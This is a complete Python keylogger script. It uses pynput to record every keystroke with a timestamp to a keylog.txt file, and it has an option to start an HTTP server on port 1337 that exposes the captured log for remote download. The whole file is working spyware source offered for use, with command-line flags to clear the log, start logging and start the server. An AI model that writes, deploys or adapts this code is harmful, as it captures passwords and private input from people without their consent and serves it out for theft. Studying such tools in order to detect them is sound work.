#!/usr/bin/env python3
"""
Script name: __main__.py

Description:
This file is the main script and is meant to be executed.
"""

import argparse
import http.server
import logging
import os
from pathlib import Path
from pynput import keyboard
import threading


def logger():
    """ simple function to log keystrokes to keylog.txt """
    # configuring the logging module
    logging.basicConfig(
        # Log to the file "keylog.txt"; create it if it doesn't exist
        filename=f"{file_dir}/keylog/keylog.txt",

        # setting the logging level to DEBUG which logs all messages
        level=logging.DEBUG,

        # Use the specified date/time format.

        # Used directives and their values:
        # %a = abbreviated weekday name
        # %b = abbreviated month name
        # %d = day of the month as a decimal number
        # %Y = year with century as a decimal number
        # %H = hour (24-hour clock) as a decimal number
        # %M = minute as a decimal number
        # %S = second as a decimal number
        datefmt='%a %b %d | %Y | %H:%M:%S',

        # The format of the log.

        # %(asctime)s = the date and time of the log
        # %(message)s = the logged message
        format="%(asctime)s - %(message)s")

    def on_press(key: str) -> None:
        # logs the key to the keylog.txt file
        logging.info(key)

    with keyboard.Listener(on_press=on_press) as listener:
        # start the keylogger (listener)
        listener.join()


def server() -> None:
    """ open an http server on port 1337 uploading the keylog.txt file """
    os.chdir(f"{file_dir}/keylog")
    server = http.server.HTTPServer(("", 1337), http.server.SimpleHTTPRequestHandler)
    server.serve_forever()


if __name__ == "__main__":
    # get the directory of the file: keylogger
    file_dir = Path(__file__).absolute().parent

    # create parser object
    parser = argparse.ArgumentParser(description="Keylogger")

    # add arguments
    parser.add_argument("-c",
                        "--clear",
                        action="store_true",
                        help="clear the keylog.txt file")
    parser.add_argument("-l",
                        "--logger",
                        action="store_true",
                        help="start the local keylogger")
    parser.add_argument("-s",
                        "--server",
                        action="store_true",
                        help="start an http server on port 1337")

    # parse the arguments
    args = parser.parse_args()

    # check if the clear argument is passed
    if args.clear:
        # clear the keylog.txt file
        with open(f"{file_dir}/keylog/keylog.txt", "w") as f:
            f.write("")

    # check if the logger argument is passed
    if args.logger:
        # start the logger
        threading.Thread(target=logger).start()

    # check if the server argument is passed
    if args.server:
        # start the server
        threading.Thread(target=server).start()
